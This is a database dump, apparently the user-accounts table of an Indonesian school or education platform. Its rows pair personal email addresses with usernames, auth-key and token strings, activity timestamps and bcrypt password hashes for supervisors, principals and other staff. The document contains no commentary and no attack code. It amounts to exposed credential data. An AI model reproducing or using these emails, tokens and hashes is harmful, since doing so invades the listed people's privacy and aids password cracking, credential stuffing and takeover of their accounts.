| 980  | NULL                 | dastandafin@gmail.com                                | 2        | HJV0NMsYQ0dPB1R-92GdvFktUMoifUBu | pengawas malam                   | 1623034743 | 0          | 0          | qiuFa1kUI8V_kZR7Su3cBEJbMoRZucyPnfQK2PLU | NULL         | $2y$13$Z0ydHibYwikddS.I0zZ1LeZOoi8Et3B4Pg/Pis50cNdiyEo6dwyaG |
| 986  | NULL                 | cek123@gmail.com                                     | 2        | r8KsEOWesJah42SseRDwXtIiQf7Wj-t7 | cekcek123                        | 1623317261 | 1623308539 | 1623317018 | X25UQoDTNeI0TDGHPbVYLd9RI3AEXvJ06rmxKCHu | NULL         | $2y$13$z59QMbOMgSjyvkySFh9beO17OKwAOfyt44Gp2TVV8RZhKBWhjx9KK |
| 989  | NULL                 | myking213@gmail.com                                  | 2        | WfZ4vu-2M7Yx4ISLIKgEf5pHgeudldgl | PENGAWASAJI                      | 1623316333 | 1623314369 | 1623316488 | rhYzFzMDJ4w422sGeY9jJSTr-2RnYGgxJWUAr-6P | NULL         | $2y$13$q.h093tkwS3vvBc52rDoGuNSfdf7rKEVceXCO0SuuipkZPX2SbWzi |
| 992  | NULL                 | dADADAD@GMAIL.COM                                    | 2        | qgRNqs1w06uTSfAh_pcUzTg_5CehvUHn | awdawd                           | NULL       | 1623318197 | 1623318197 | _K2jefyEaOpjbp50jO5kUa2NQ_vWNSyyYYxbTmr1 | NULL         | $2y$13$4cCIpc.vqCnZlFKOTP9N0e2n50TeXh8clVg1KjKlWiJQRZIZk3Uce |
| 993  | NULL                 | sitiathallah09@gmail.com                             | 2        | k7vTBg3miO8ghhvg-emsO0NCxiZ6VdkP | siti                             | NULL       | 1623318746 | 1623318746 | 2mgotxAU-PFIFy-UWlPVBCZzhsg-ULNcZpIV4oa- | NULL         | $2y$13$5HGJD3EME49OqbO/zCCHc.NIej/HKjW9XAiWJsMEJIuv.tchJ.IrC |
| 995  | NULL                 | syafii.maarif0955@gmail.com                          | 1        | 7jfup1RpEjMlQUnIVM8SlG3ms9y-rgqH | syafii                           | 1623371671 | 1623334020 | 1624520611 | _gYc0onfjlypR_MmgR9IV2fkzm9cFHz3nwFWZJJ_ | NULL         | $2y$13$iw2CEI4.b4LHzzDIQZIhneOocdn5n7gRQXFuw.p9WVrH/qshgWZ1u |
| 996  | NULL                 | mangamarpurba@yahoo.com                              | 2        | qzQpJrcVPsxUyureSbDxJiCDZefaXfI2 | mangamarpurba1961@gmail.com      | 1623373396 | 1623373345 | 1623373396 | wFV21vYh7FBBxW4TmhlHSfx65EX3xXNGL8OZrY6V | NULL         | <blank>                                                      |
| 997  | NULL                 | amzafauziah9@gmail.com                               | 2        | WnRH4UjKIHql1l8iptUztXHtohIXfoXI | MitraAG                          | NULL       | 1623376316 | 1623376316 | adf5z-uABpue3JQfpzRpgQ6EZ4lg00VE8EhvZqHl | NULL         | $2y$13$jLTiCJT2VPdIaPCJrGO53u8hGAN5qrPmEnH7N9fqHUEDapc/ZUqz. |
| 1006 | NULL                 | deviardnsss@gsmail.com                               | 1        | IRaPPUPJ7xM0L2kwQjBMD8lfbCnA5HCI | deviardnd@dddgmail.com           | NULL       | 1623482709 | 1623482709 | EP7tdNqoDx26dG3lfnhnktIaPKaZZ6O8b6vzbmhI | NULL         | $2y$13$i51wBWZFDhaYvQXOxw1YQu5L6bHJ/zt8EWfsmLNbuYCJvYn0L5M4a |
| 1022 | NULL                 | dadanggadel@gmail.com                                | 1        | tHHfESAe3qGNEDpqc7yYfSzBDGOR2UnI | pbj01@datadik.id                 | 1626271771 | 1623945235 | 1626270695 | ZsWOG6m9mx38JcudyGctHhHtsBjVVyFnpsEWUYZ2 | NULL         | $2y$13$9RXFWxcnxwQcmO3oimzDi.PFvEl3c2CqFhPQSDHgmFTnpXZiMxekG |
| 1026 | NULL                 | Adminn1@gmail.com                                    | 1        | a11qioIPjVAby-vLCN4rLlp6gnrvNWx_ | Adminn1                          | NULL       | 1623998845 | 1623998845 | IwDIGFqh37-n5ilpbbLj9DlbWWmire9rFYdm5GzG | NULL         | $2y$13$qBYgUPe.eXCKaCvwwLpqXece/DDhJGBV8RcvsEkgSM3WDoyOEZZf6 |
| 1030 | NULL                 | superintan@gmail.com                                 | 2        | RpOoF8qdDINAOgD0mQYN03rItij3LqK2 | superintan                       | 1624330840 | 1624330270 | 1624330270 | aRPn8aSKvn01uyDtWkTa9CmRc6hiz6zQdDNA3Q9z | NULL         | $2y$13$VPEelT.piPkFaRztdxfVyukA9XBlFiYYKsocnO1GMzgiLWM0m65Ui |
| 1031 | NULL                 | miramoka2015@gmail.com                               | 1        | L8sVeKoAL2CYv5PTFFE1-rOnfkfH9AmY | pengawasintan                    | 1624332186 | 1624332052 | 1624520941 | JaXeLj4rdraM0GGizUyMgUKXKhBACg3N_F5_JPFH | NULL         | $2y$13$b9BVm3/7h870gq8mEyEfqONfie8h3gr3dajTpKJakmSn8sHb8EVj2 |
| 1032 | NULL                 | riananananina@gmail.com                              | 2        | xBazlsbfDpqChrVE1r2iTFQWEPYl9Cik | adminMitra Riana                 | NULL       | 1624351121 | 1624351121 | tEhqpEVPvr_zKBwiJ84DR1ta4CQbxPBTLVAdZKIJ | NULL         | $2y$13$RDdax1BY/48piVGMlDCpb.wA5JSc5LmKt2ARxxMicizSjgXnBXrBC |
| 1033 | NULL                 | nananina@gmail.com                                   | 2        | gFC9iq-r7ZDbCGCBwwYK6DOSU05IUIN3 | kepala sekolah riana             | NULL       | 1624351736 | 1624352316 | nAonx8X5l6w6yHQfJSLfrMOzwk0kmDgkoiAzNeI_ | NULL         | $2y$13$zDZhWWFjdQ9xgWzLtoqVBOIYmGRkSlu45eqR6HLZ7tbKuMAh/O.lu |
| 1034 | NULL                 | nananinano@gmail.com                                 | 1        | o0IYOFedHoDyV3S2FBMWlb9Te1mNK_KV | kepala sekolah riana 1           | NULL       | 1624351985 | 1624351985 | R9h2fBlZHn9pe1ccHe0MUnsXAhjJjGLkpQ2bXNO0 | NULL         | $2y$13$9cYLoGju/fr.uSGkYawva.MncvHh89Jy2scQ28giSuuZGDJGkI5z6 |
| 1036 | NULL                 | candraabdurrohman@gmail.com                          | 2        | 16DmIAEoG0e7Avd5oPmfDxS-fZtvXXaT | pengawas_hore                    | 1624363696 | 1624363215 | 1624518633 | Jo7kUhWYJD6tTI95Py22KJC8tHi0kfypEP3zy0e_ | NULL         | $2y$13$Ccsf5mQyoXJHz9ybAwQg4utaoi9JICNsidZFy1ecIzVXvIOdq9.YK |
| 1037 | NULL                 | hasiansssiregar45@gmail.com                          | 2        | I_VoQ9D7e5Ax7I_SvzcfPZhuc_NwZVfU | pengawas_jo                      | 1624363885 | 1624363821 | 1624363821 | j8P7URnVYGo9qwz5rZlqZHWmE0BybUkp4ZToPzv4 | NULL         | $2y$13$wp2rXc2ArQkEg8oaGkDr0upn4uspZ54x96fPG/Xs2hzJjgD28malG |
| 1038 | NULL                 | hsyuhadassiregar45@gmail.com                         | 2        | Ho9Ws_SXgskLciljua96K6w6aRdz2ikP | pengawas_jo1                     | 1624518694 | 1624363980 | 1624518660 | pIUFgn5BF1TGVppH4ppCq3AqHNCKOjoRDBUYc1tt | NULL         | $2y$13$sWxrNfERA9XhVYXDlCOUye5zz2l23nUCa5184JsOjbz3NEbeloDXS |
| 1039 | NULL                 | haryuniati15@gmail.com                               | 1        | qkJGgDCOsuiqx5R5KJNxMmj8I6MsHT84 | newmanhd2@gmail.com              | NULL       | 2021       | 2021       | MvuwQy9HJcACooe8nh9jbj2UmSmlbD1ogfAcysQX | NULL         | <blank>                                                      |
| 1042 | NULL                 | kaptenopi11@gmail.com                                | 2        | 52823ZeNcRFuh4JKWYpeQpUT3Zk7oKyK | MitraOPI                         | 1624508144 | 1624508010 | 1624508010 | kHbSyf1WWU8jRWBQ-w1RRVzewFuoZKwBGZnkpiyj | NULL         | $2y$13$zc8Xou4tAU..GlG419fNjuxbIzxyXtKcreO3Lbecj.ZDv/RWPP81W |
| 1043 | NULL                 | Jaya@gmail.com                                       | 2        | sjr04CHWVh31rgru4qUA9lOOaznku9_q | adminMitraJaya                   | 1624854592 | 1624520225 | 1624520225 | tthqJD781uMvTTnZJv__skOYw-JMABkvtfq8gTns | NULL         | $2y$13$s/ImFlPcyRjoTmv25K2/l.rAn8LCoKXxtefzEg1GqTR7Q29aBAbZS |
| 1044 | NULL                 | dzakybalang@gmail.com                                | 2        | bUs7CIpZyavUKbFeX33Jn0-LF4OGZlsd | adminBaru                        | 1624676942 | 1624674214 | 1624676022 | qg-21EgGGKYYP4vaH0IqntbPtL3lem7tPeoYBa2L | NULL         | $2y$13$cI0bdvPJGy8QSGbtXf7dX.ZnrnldDshIwznwd976mbXIwhwJyyVbu |
| 1076 | NULL                 | isnagalsari@gmail.com                                | 2        | umd1AOpPdQDIvTsGYKiKv3edjQbjfYxa | pengawasLagi                     | 1625011921 | 1624872169 | 1624873129 | TssOE47M60q5O64HCCVrIP7UJa3v4qeCiHto1yw7 | NULL         | $2y$13$AyY3OAfjsgNeNDHrTdqxwe3mMRMomy.M.xj.nsSMp.KIGyPQGWlAm |
| 1078 | NULL                 | jojonsiregar4545@gmail.com                           | 2        | i6ytODFe7Lx-DXbimMpMSa-FYtQJD915 | jojonsiregar4545@gmail.com       | 1625016465 | 1625016412 | 1625016412 | NutfcAHsSTUPVdGJVYDhUQC2h94LqbbZoxn9BhWH | NULL         | $2y$13$vFdXi1Om7SNBifExCy1H6O8N7qml1bn.pPaHSfqWUVdBTKIoyovwK |
| 1080 | NULL                 | r.adnin.m.a@gmail.com                                | 2        | 00RWedeP_yVKAht-esV-fgUSvamjLdZ6 | Pengawas Pak Gito                | 1625209654 | 1625026224 | 1625026224 | Q7qN5hXqQF74uSkaR_gZOE97Rn3KptObjLhgmyOT | NULL         | $2y$13$ntKRt8sObK/eOr0ALlO0PudNc90xhXIKJ/k.3LNd//pOi0WVt.qAG |
| 1081 | NULL                 | imaskurniadih76@gmail.com                            | 2        | 1ESU4jtOsjm1TdN6R6cCn9dOY8rTJAP8 | imaskurniadih76@gmail.com        | 1700327433 | 2021       | 1700327432 | gCRQemzMzQTcOEnW1ZnbsPPROoEHk5CCGRMqZcKv | NULL         | $2y$13$wX7k35VMPbVETqLMWtri2OCVPDkhAdYogZ5AjHlsmFE4eR5Lay9bW |
| 1094 | NULL                 | vernonmariner@student.uns.ac.id                      | 1        | JJ8TeznJYuBrkOyKAU0DDCrmrp7YpwYm | Pengawas Candra                  | NULL       | 1625133810 | 1625133810 | f25cr986jtP7Xg_269TEuJWT-3sy8e-NPLaJmqDg | NULL         | $2y$13$RfU5FMTM3yHbPxGc8Y4y9u1OCQ3.3/FF/Es1svrMXx1a8mmWpwSqe |
| 1097 | NULL                 | iyhoorioo62@gmail.com                                | 2        | NH_iLPdY-lC5IwpzQO5QcwD_MvePi-NA | Pengawas A                       | NULL       | 1625209370 | 1625209611 | VT24vC6GwkmNDi6smoz2dQW2sQT_STWy4SNVRvuw | NULL         | $2y$13$nVcW2O89wxKKMdgSJTwaGOvucb8W.JbI8MucL8gcXc5Gbkt301YIe |
| 1098 | NULL                 | nova.kurniawan667@gmail.com                          | 1        | D47A2l5Bt7cKE0Eqy3Q5laJ8JHHm9KJN | Pengawas BBB                     | NULL       | 1625209454 | 1625209454 | zROoizhucOxv6jMJOuOSo1qVORGYcwnMJytox4hV | NULL         | $2y$13$h43GkfyROEb9O6UbPCMRT.E0BLWE7fgVDzRt1bvRs.Y3omEPahuGa |
| 1100 | NULL                 | kulonde@gmail.com                                    | 1        | A_8DRLa_sWmO71nh7ab08nKAryT_OH1Z | Dhanurrdoa                       | NULL       | 1625209838 | 1625209838 | 2YGhGG32vSt53QirAaFl4GndMKFDHVex43BfdOHI | NULL         | $2y$13$cGzQ0VVw0iX4n2EoK/ZmVeOxvtkGcWp2mOgwVR1ZeFwoDtGvot.HC |
| 1101 | NULL                 | jojonsiregar4646@gmail.com                           | 1        | maG2W0FQLCXCXrzepLS7eKQNVsmhkhe9 | Peng_cob_1                       | NULL       | 1625209917 | 1625209917 | 4CIy59c2bkIR-2XBfRTR36nLt91NfLienTqxhU0y | NULL         | $2y$13$ja2Lt08pcAT/z5Ljqpuq6.Xa4zmD86wyyumGqPZ/1GCT9XQKZBeWi |
| 1104 | NULL                 | jojonsireiviwje646@gmail.com                         | 1        | 2bBU-bKAXR5sKZSo8NF8w2Z49oXg5WQP | pengpeng1                        | NULL       | 1625210011 | 1625210011 | HfkO04aeoOK5KS8HPJFkcv_a_lCrGniU-dB-Xdju | NULL         | $2y$13$J3JPdYJtsboDEqTyJYhUdOECArK9uoYEn5F9bNN33JKBqkE5x7FGa |
| 1105 | NULL                 | jojonsouvbwounvwje646@gmail.com                      | 1        | ybb6cQrU9WUsnN6COaNPyT0JlONMYots | pengpeng1_3                      | NULL       | 1625210111 | 1625210111 | 21M_UB9Ob_NXZc2yfhbYLjE3Dt9GKUBZxYdWn5ad | NULL         | $2y$13$pNxpmPpWqP2xQedax1/HSuen9uzeWxtfsQ7bkGlF/Gpohk1jVSbpG |
| 1108 | NULL                 | aaaaaa@aaaaa.com                                     | 1        | V33PihySgxhE17XriZMJOUMXj6xUfV0_ | aaaaaaaa                         | NULL       | 1625211124 | 1625211124 | 35Vw7CSPLfonARIlTULhMkywSqnslmtwPOw5KxSu | NULL         | $2y$13$DGHEBbVo/HadUyGRT7QLrufs9VN0PcvW2ApyrieF10QvKFRsjri52 |
| 1109 | NULL                 | aaaaaaa@aaaaa.com                                    | 1        | kAgAs9lfkSp0OdgYrXQg1NuCg9yPk401 | aaaaaaaaa                        | NULL       | 1625211398 | 1625211398 | tqH2RHhR4SD7E_Mm-ON2L01oCW_wxsafBoDg86Cw | NULL         | $2y$13$/32Ol/aSeG.F8MhAjmhwGOI9.J5srQc0Jh3Q6Yz1m.qm/BI7nTll2 |
| 1110 | NULL                 | deviardnssss@gmail.com                               | 1        | 9YSmkIQeRlqyT-EagH11r0p7m7g-sXWB | testpengawas                     | NULL       | 1625212153 | 1625212153 | KARcnxGRBIEIqHHqv-SYnsvTxrVUZZ_iKLiiR5W6 | NULL         | $2y$13$78MnTH/Wtu8WKQ.oNd587OpTMi13PZ9xhbGj.ucKkcAqm4uuLEGU2 |
| 1112 | NULL                 | aabbcc@mail.com                                      | 1        | GBP39u3l10GZme8E2H_BYm36a0hxci-g | aabbcc                           | NULL       | 1625212301 | 1625212301 | R-mMKRNpsK-__1RobGcn0gDfmWbBQtA-e1K6ORTC | NULL         | $2y$13$RDGgMSHIePJ2kc8MIDChU.blFMdKbETgEGUQGodMsczonmjgfTdla |
| 1125 | NULL                 | deviardn@gmail.com                                   | 1        | EudHaIGdHwdrR8hTO44v6sy89Yt6WxNJ | testpengawas22                   | NULL       | 1625216083 | 1625216083 | kZS7a7-Hibbi7APDooPTzlcOUOKSG9al-fmo-KTc | NULL         | $2y$13$jGiOPSNgmNs5ET2lbaEm0ObvAkBTfU0SyHeoSlYAs6CE.kWf2a/si |
| 1126 | NULL                 | windu.bangjo1987@gmail.com                           | 2        | TVckuKN2C1D8I8dBvjR1Fr3l9HQd9eU3 | Pengawas P1                      | NULL       | 1625216767 | 1625216808 | Qv2viyZI6S9csK3zFD3uxzQPeWydkSRq6LICWNnJ | NULL         | $2y$13$1fQE.7EvtIpwXq.0Dtw3WeJdAcNmGEwOsy4aOtSb5UphtrBDlsrTe |
| 1128 | NULL                 | suyantoyantoxx@gmail.com                             | 2        | aKlkjiPsAQ-rpu8dpT3AZ4kH3WqJutCc | Pengawas Eko                     | 1625218417 | 1625218301 | 1625218301 | m05BHpq27a-u2UbAiGmNVIAWpPhPToxMfCp9RShF | NULL         | $2y$13$azDOZJFxswtaYd75D5Eb7.SiUuxeiLjCBeUfLWWR7MX4oThrjdwiq |
| 1130 | NULL                 | innisimsim@gmail.com                                 | 2        | hGoi7xQOO1smvAk5iRWOZSTkQe649xHU | innisimsim@gmail.com             | 1642470712 | 2021       | 1628066725 | 3g9avULriY6gu7TuELguPFSIR8jhPwTF67JzTp3z | NULL         | $2y$13$1smk7UvHM8XvTjxjJDXD/eabt.M62xdWNDeKu8dzTfRneVK3MyexK |
| 1131 | NULL                 | enisusiati1702@gmail.com                             | 1        | 3lWEkuvq3imBXtOTPYY2Fkox8tBm8NBB | enisusiati1702@gmail.com         | 1710205964 | 2021       | 1710205962 | vGe6jXP5AdY2SonOYJK4vQUu0vUoMdol4wGG3eio | NULL         | $2y$13$wbHs.vgNveYARbkxciueRep3EXqEafoydkot2WKejTYz5Dgev4uY. |
| 1134 | NULL                 | ratnajumsar65@gmail.com                              | 1        | 67Nsanva8F8LxwK5SMK5tglqu2HEsRqU | dra.ratnaarloi@gmail.com         | 1720490200 | 2021       | 1720490198 | v1bbbmc1kIIHPmjQ5WwFjkeB7BlcHWEeSBFYM84Y | NULL         | $2y$13$j.bbU5CwnM2Rv9R74cfiMOyXQrAFzy7sQljXlG9L9FrSca8HpSukC |
| 1139 | NULL                 | warsonocangko@gmail.com                              | 2        | mMKp4u3fq8N8HVLiFgXL1k3teHct9XkN | kepsek02@datadik.id              | 1626321441 | 2021       | 2021       | lYHdM7pdIju2PU9bhLSiKRC3eoi2Xqhif5yclOjD | NULL         | <blank>                                                      |
| 1140 | NULL                 | testokebromanju@Oke.com                              | 2        | 8Y_EHJgiQ2BTyosBhRPL_LKB_z050l1- | testokebromanju@Oke.com          | NULL       | 1625904184 | 1625904184 | cvMk9NcWgjMN4hVohUmjxyvVgK-E2GNZHGl7gYBa | NULL         | $2y$13$.GwUVqvx/cyAbJCPHJerX.DccwOsEyNv5GDW8KVUTgRB2xmbYyEXe |
| 1141 | NULL                 | testokebromanjuss@Oke.com                            | 2        | NSCMugbP8AZ15UwfZOdhazfm3Ro_Ynnr | testokebromanjusss@Oke.com       | NULL       | 1625904527 | 1625904527 | TO8ruNDUcW1Rn2A-wpczNZUj7BxhHQJOCmj_iNFu | NULL         | $2y$13$P6jLukAEX/6ZQqb0qqMPGuwt0eYziF6bjT5yuk2dUIgAZacvTB.rO |
| 1142 | NULL                 | testokeokeokeokeoek@ol.com                           | 2        | YNDvT2JddAsPFjGLl-sF-_hPajv0O7U4 | testokeokeokeokeoek@ol.com       | 1625907078 | 1625904753 | 1625904753 | 1V1_GXjirifgI0e41Q88KxvW58zFHJfT3LuW0qrT | NULL         | $2y$13$84GX6H/eAjXsDUuriE1TKe2RPSUjGXxQDFq4rpmlifcVXgmGJ154C |
| 1143 | NULL                 | ddfdfdfdfOKe.com@okec.om                             | 1        | Nxa4EQaZiICExxrPhRH8vmIx2lKjhrPM | ddfdfdfdfOKe.com@okec.om         | NULL       | 1625905246 | 1625905246 | vgna7RW5AvXgVY04husLh5k8SCg3KrhzSAEUwBvQ | NULL         | $2y$13$xsMaWV.Dg.7ara.0hZBay.ZSOHqithpt2fG/3UnfX3qSuR3GNgbqi |
| 1145 | NULL                 | admin@intanonline.com                                | 2        | 0OxuXHz-3VkPjMEIOUY9tAaJw64gCDr3 | admin_ip                         | 1631604428 | 1626058046 | 1626058046 | Wj1rbJ0Lh3D61l1WEe24UiXHmj9m_dWxNsoIcqcn | NULL         | $2y$13$blnEIWaYmAUX3aLGzDMPO.CnUXTLmKRCXJKdJLm4wTweiW8XLijEu |
| 1146 | NULL                 | testokebromantab@oke.com                             | 2        | 4fjT7ZYCah7yfvLWP-lpB3AW_6dQVKa_ | testokebromantab@oke.com         | 1626060378 | 1626058109 | 1626058109 | 99oKuY1yKLXThLjFjljG-zYNLsCwOVLiqua5_yhG | NULL         | $2y$13$6wSygktt1Sp6PDxMNpgMZ.XWRNID8LkSPkA4qdb0IyTPIxdtNUg2a |
| 1149 | NULL                 | rofinapurwatisima@gmail.com                          | 1        | HooN1AbRv4sw4Wu0OZqUr9Kb7aYg8Udl | rofinapurwatisima@gmail.com      | 1659065813 | 2021       | 1659065812 | 4ElKqBRu4Y4RabIT0UvsxKb0MED8Z5yWlDrJi8bF | NULL         | <blank>                                                      |
| 1153 | NULL                 | nora85485@gmail.com                                  | 2        | i0pGYe7l4nac2RXbwYVcl0XOLGHNcBXR | irnandanelitasmpn7@gmail.com     | 1626233426 | 2021       | 1628066750 | dmWUp6OgTmyG5SQQIv3nUiIfzysZzOFUPvjTJd90 | NULL         | $2y$13$20pgRosjdjFNm5JhsGS7EeAVvOCkOIFCcfqXXubFG/TIqTabkLZ0e |
| 1157 | NULL                 | ahmadlinda093@gmail.com                              | 2        | 1UoXgPTU274MS1TKcuG57fs3LtfNY0w8 | ahmadlinda093@gmail.com          | 1699709056 | 2021       | 1699709054 | b0RlrjMs1OzjLFf6MjJfT18iTown9T2az3TCIAhm | NULL         | $2y$13$GNLJCAHDqQ/0XNi.yp8wkebk58e8otFap.YF8r7kiFqxwbYMrX5YS |
| 1158 | NULL                 | jamilah.hac@gmail.com                                | 2        | mn9LSulOxBIyfbwfMtjc73ufxzWU8jxe | milaoca2020@gmail.com            | 1646447674 | 2021       | 1646447674 | VOC2NnWHpcVNbIC7RNnd9ktC9tIYyZIBPLFYKFBx | NULL         | <blank>                                                      |
| 1159 | NULL                 | liesmana.1967@gmail.com                              | 2        | 6kZWlr463ifoQN995Luq5k0pTvqTuE15 | liesmana.1967@gmail.com          | 1641871514 | 2021       | 1641871513 | JNNXSJDoHZ9aCnji1ndPldXioLbDoGtOOQ9CGQIX | NULL         | $2y$13$bC/30QRxxq9dJvl/hkiwWu04HJU1bAfJhdNt.AhIKZpqEYngDe8EK |
| 1160 | NULL                 | sdn2poniman@gmail.com                                | 1        | o207DZkeFDgnEIwRIrMrZHz25ipMGywK | ponimankepsek@gmail.com          | 1659326564 | 2021       | 1659326541 | LbOnCHCpGcTHxLsanrSxXpNRPNQujVq6PX1Tszv9 | NULL         | <blank>                                                      |
| 1161 | NULL                 | sabrihusna77@gmail.com                               | 2        | 5JhKcxW7EKVquqRGqY6PXQ2AkkmA1aVC | sabrihusna77@gmail.com           | 1626943223 | 2021       | 2021       | aJRCIjwrWCd2lvjqnpM20vqeQogPjlrgv6OTgAZN | NULL         | <blank>                                                      |
| 1162 | NULL                 | kelikwibowo@yahoo.com                                | 2        | HexFOZODd5Ib2jw5VJJMxZhypE3qwYAJ | keliknew492@gmail.com            | 2021       | 2021       | 2021       | A3WGxYWyJsBuQyrtx4dAvD1v2nv5P7VPSJFAnvNn | NULL         | <blank>                                                      |
| 1163 | NULL                 | juhaldi.zainuddin@gmail.com                          | 2        | 6CaKd2NHU45dEkly5cZo2rdBCzDBkcj2 | smadh.mirpatni@gmail.com         | 2021       | 2021       | 2021       | rkIoRTVuhpxZnUXpKklREfgXHpMQ2Bnk3RmXlG9P | NULL         | <blank>                                                      |
| 1164 | NULL                 | supartinispd42@yahoo.com                             | 2        | GvBj9MTfURyKaGOk5Fr02SKDo1nGzYCi | supartinispd42@yahoo.com         | 1673500974 | 2021       | 1673500973 | 3FIQtvNaKrQvrBqyvUzet2incG0W5Eoa619CanVn | NULL         | $2y$13$A9/Sp.8w5cROd92KzuLR3enHfoaPvRY4SenChkpZnvkh9K2COw0LO |
| 1165 | NULL                 | iwanbacan66@gmail.com                                | 1        | 6Sb29KZsdk7YnyYnmgm5IgT4GY1E4bzN | iwanbacan66@gmail.com            | 1643780963 | 2021       | 1643780963 | k233xmUkEfn9tzmgDOuNKw7Dk2GK3wD1i9yOLAOU | NULL         | <blank>                                                      |
| 1166 | NULL                 | rohadys119@gmail.com                                 | 1        | fa2i3lb5LSCBJGTenK2tEPiFj0iK2j3A | rohadys119@gmail.com             | 1660966279 | 2021       | 1660966278 | kIGRgRmIgIgubW8eBwSrTSWqfhfWaEC9zAikG5zW | NULL         | <blank>                                                      |
| 1167 | NULL                 | suraidah@gmail.com                                   | 1        | eQLiRwfha8n8JzhQcDxfW2t7Rd9rdUOd | suraidah@gmail.com               | 1681198188 | 2021       | 1681198186 | BmmrlkGXONCKYU2vGBtlEirprQkAQR6ZFZEpGRwA | NULL         | $2y$13$dLHHy1QMFBkiXUV2cLkZ/eVlOqwjDVAtmDRVYriKXCKjqv295PJgu |
| 1168 | NULL                 | kamaruddinharun68@yahoo.com                          | 2        | p0fpYa61vT8hxzBZkn7ryH8kKc9ryVym | kamaruddinharun68@yahoo.com      | 2021       | 2021       | 2021       | N8Q5wx5nNsJ8VBgetrLhPHNIS9UmGPdGEAR33trl | NULL         | <blank>                                                      |
| 1169 | NULL                 | yosnino@gmail.com                                    | 2        | Dd4tkBwM0GFuBNDVH11FyXYT0s7YFcM8 | solemandethan5@gmail.com         | 2021       | 2021       | 2021       | hy3wK2xZWosmcyPTx7oiOfjPdWwdWa5GdpgQY52t | NULL         | <blank>                                                      |
| 1170 | NULL                 | dwidianfitria@gmail.com                              | 1        | NbjPWpo8Soant45POSM0pEGRFV3VzqJY | okedjaswarni1@gmail.com          | 1693880837 | 2021       | 1693880835 | YBnTIXRrWV8WCqcgDdJMOcWUleJ6jDYXIQUQMZJv | NULL         | $2y$13$d0YIzdXXbNh6Lq0Zf4e1V.nluSCdZaY/SRW59eNXliizH2Ahfg7nW |
| 1171 | NULL                 | khoirunniswatin06061968@gmail.com                    | 2        | owl1Gk58FmBquAnW3HyFH48vg5dUkwAB | aslamiyah1971@gmail.com          | 1706076557 | 2021       | 1706076556 | Klf4TMQZF51AbTS3pt8X6HhrS4TOVe9p4p6tSwM0 | NULL         | $2y$13$XDxWCGR8XlLoOc7YmsX8R.G9jKFNMyY5UfSyv8doYx2qFMPN7S5Qm |
| 1172 | NULL                 | bambangcempaka313@gmail.com                          | 1        | qCaFOd995dCAyeoaxzFqR2gaTWKlsdZz | bambangcempaka313@gmail.com      | 1721870196 | 2021       | 1721811451 | PESiAU09EAYEsMI9z9VuIqPCLeGM24hxwUYlxSkW | NULL         | $2y$13$mlqYgsnE9uA91AfKlbgQxepIM2ARWxoGX1u8Ksb3dB9EKkeFDz04C |
| 1173 | NULL                 | sasiyah293@gmail.com                                 | 2        | XgfvVE6GdvXyeWAzHx1KptXO53CBD4Tt | hjsitiasiyah16@gmail.com         | 1627004887 | 2021       | 2021       | D8OWbGqYUn3Rl3ugtHgQpubYfdVXVzPL0Eh3Db7g | NULL         | <blank>                                                      |
| 1174 | NULL                 | gunawantmarumbona@gmail.com                          | 2        | oGp9d7r3hSyRq5wmTPBW82aUfKywonud | gunawantmarumbona@gmail.com      | 1702002115 | 2021       | 1702001985 | CGGW8Je7R9jAYyGx3TkcSTRZy8g6Uq6VbJ1VWZWs | NULL         | $2y$13$seRaJKyrWLa47/BVbgDFd.UlQe4zkgbxt/cWpQ9.NMZeDP7hKoXCi |
| 1175 | NULL                 | suwito.spd@gmail.com                                 | 2        | psLGjbhD6XTA5VEswSJC3hXGCCS46c2l | suwitosmp4tegal@yahoo.com        | 1719818294 | 2021       | 1719818292 | rccV#jnnWtSFEhAhJeua5L3a1vf9zhfgrAoLff   | NULL         | $2y$13$nbQrY.tDR87yIoyDhqWAGuwST75cK/Ocv2VKgfKStVwbKhZMQiwLu |
| 1176 | NULL                 | nahrowiabunawas8111@gmail.com                        | 1        | SNQGN4wvYPU1YbubQtuz4U1wO7sWD04f | nahrowiabunawas8111@gmail.com    | 1716600299 | 2021       | 1715915121 | 6kOYTFsBzSqKOBGYErnBlvjO3QKs6BjjASkByA0U | NULL         | $2y$13$MMWFlCWpTtSv4g6ByMArpeaALmRbpPdx99kxdk0AyPrv54ZQP7F96 |
| 1177 | NULL                 | kadaringsih@gmail.com                                | 2        | bjylv98RLitIy4UAoVEMtlqEcpYXwfVt | kadaringsih@gmail.com            | 1684543566 | 2021       | 1684543564 | ddPfw1N4YXW6rT5fGTidBHTWkB1qpvdlVlICaVJf | NULL         | $2y$13$29SzoGYSqhzd1FKj5YNub.czszVHOkQZlCStoRDr2zxJ9rEd.dZ4C |
| 1178 | NULL                 | rahayuwelas70@gmail.com                              | 2        | 6DHwbWukEwmOo7OaCRqOnjK1GSKZc7bF | rahayuwelas70@gmail.com          | 2021       | 2021       | 2021       | i9NG2DBkeBx6gm0pNQTMA006wPZgmekT70pp1Cjy | NULL         | <blank>                                                      |
| 1179 | NULL                 | abahalwi13@yahoo.co.id                               | 1        | 3JVlEtSSx0UXvIeqERuiZql9O3vlHS4k | abahalwi13@yahoo.co.id           | 1652931987 | 2021       | 1652931986 | 0XrdGTI7JIDo3QZcBZhNDlgldHXwVg06gJuQguM4 | NULL         | <blank>                                                      |
| 1180 | NULL                 | wayanarini1211@gmail.com                             | 2        | E72ouTypH69RLNbqpeU7OiLH9NLfBuyk | wayanarini1211@gmail.com         | 1627098869 | 2021       | 2021       | P9Mua2W01QYhpLD3GbnqbBZstrbWHJpP88Z4m9kk | NULL         | <blank>                                                      |
| 1181 | NULL                 | rumiyatunbantul@gmail.com                            | 2        | hcMO2sHeevwkveWQ1pBXOLxPqI5UFXDu | rumiyatun2310@gmail.com          | 2021       | 2021       | 2021       | YHQj2ZnaidV24cHSQEVxPDaJ8shxUxvwirVopdGC | NULL         | <blank>                                                      |
| 1182 | NULL                 | dwianissarikristiah@gmail.com                        | 1        | jlkz8beaKqcPonb1GF5Wul50ONzCkNFQ | dwianissarikristiah@gmail.com    | 1639072324 | 2021       | 1639072324 | bNGWUus3GgWtEKGKZGBQKeTcQYl53kn5mlL9lXoi | NULL         | <blank>                                                      |
| 1183 | NULL                 | bahrudi.02@gmail.com                                 | 2        | hEoAzVt0WWnd6RQEMPhu06ci8gQjIss4 | bahrudi.02@gmail.com             | 1628585345 | 2021       | 1628585344 | wLa1I6EsgVN3JSLX6VzfJcuD3YrhT1TiByY5dWvx | NULL         | <blank>                                                      |
